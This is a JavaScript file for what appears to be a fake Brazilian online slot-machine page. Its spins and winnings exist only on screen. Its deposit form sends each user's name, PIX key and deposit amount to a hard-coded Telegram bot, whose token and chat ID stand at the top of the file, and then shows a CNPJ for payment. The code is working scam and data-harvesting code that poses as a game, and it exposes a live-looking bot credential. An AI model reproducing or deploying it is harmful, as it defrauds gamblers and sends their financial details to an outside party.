const TOKEN = "8568148429:AAGzu7zf-n-fGJnUpaNGVCLvQnsR2JxJ3fs";
const CHAT_ID = "7668457919";

window.girarSlots = () => {
    const colunas = document.querySelectorAll('.coluna');
    const simbolos = ["🐯", "💰", "🍊", "🎆", "💎"];
    let giros = 0;
    const intervalo = setInterval(() => {
        colunas.forEach(col => {
            col.querySelectorAll('.simbolo').forEach(d => d.innerText = simbolos[Math.floor(Math.random() * simbolos.length)]);
        });
        giros++;
        if (giros > 15) {
            clearInterval(intervalo);
            if (Math.random() > 0.6) processarVitoria();
        }
    }, 100);
};

function processarVitoria() {
    const apostaAtual = parseFloat(document.getElementById("valor-aposta").innerText.replace("R$ ", "").replace(",", "."));
    const ganho = apostaAtual * 2;
    let saldoEl = document.getElementById('saldo');
    let saldoAtual = parseFloat(saldoEl.innerText.replace("R$ ", "").replace(",", "."));
    saldoEl.innerText = `R$ ${(saldoAtual + ganho).toFixed(2).replace(".", ",")}`;
    const msg = document.getElementById('notificacao');
    msg.innerText = `PARABÉNS! VOCÊ GANHOU R$ ${ganho.toFixed(2).replace(".", ",")}!`;
    msg.classList.remove('hidden');
    setTimeout(() => msg.classList.add('hidden'), 3000);
}

window.abrirModal = () => {
    document.getElementById('form-deposito').classList.remove('hidden');
    document.getElementById('info-pix').classList.add('hidden');
    document.getElementById('modal-deposito').classList.remove('hidden');
};

window.fecharModal = () => {
    document.getElementById('modal-deposito').classList.add('hidden');
};

window.copiarCNPJ = () => {
    const campo = document.getElementById("chave-cnpj");
    campo.select();
    document.execCommand("copy");
    alert("CNPJ copiado!");
};

window.confirmarDeposito = () => {
    const nome = document.getElementById("nome-usuario").value;
    const chave = document.getElementById("pix-chave").value;
    const valor = document.getElementById("valor-deposito").value;
    
    if(!nome || !chave || !valor) {
        alert("Preencha todos os campos!");
        return;
    }

    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: `Depósito: ${nome}, Chave: ${chave}, Valor: R$${valor}` })
    }).then(() => {
        document.getElementById('form-deposito').classList.add('hidden');
        document.getElementById('info-pix').classList.remove('hidden');
    });
};

window.alterarAposta = (mod) => {
    const display = document.getElementById("valor-aposta");
    let valor = parseFloat(display.innerText.replace("R$ ", "").replace(",", ".")) + (mod * 2);
    display.innerText = `R$ ${Math.max(2, valor).toFixed(2).replace(".", ",")}`;
};
